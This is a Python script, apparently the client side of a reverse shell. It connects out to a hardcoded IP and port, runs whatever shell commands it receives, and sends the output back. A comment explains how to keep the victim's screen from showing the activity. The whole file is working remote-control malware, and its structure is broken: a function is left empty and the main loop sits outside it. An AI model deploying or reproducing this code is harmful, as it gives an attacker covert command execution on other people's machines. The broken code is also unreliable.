#IMPORTANT NOTE -> First run server, then run client
#Comment line 19 if you don't want client to see result of what you're doing

import os
import socket
import subprocess
import time

#Create socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '192.168.1.44'
        port = 9999
        s = socket.socket() #<- actual socket(conversation) between the two machines
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#Connect to remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        time.sleep(5)
        socket_connect()

#Receive commands from remote server and run on local machine
def receive_commands():




while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8")) #what directory are you changing to that you listed after 'cd'
    if len(data) > 0:                                             # v {takes any output and pipes it out to standard stream; we get all info if you were just typing into terminal from computer itself}
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #open up process and run cmd in terminal
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '> ')) #allows you to keep track of what dir you're in (i.e. C:\Users\John>)
        # print(output_str) # results of what you're doing would print out on client's machine if you add this line
#Close connection
s.close()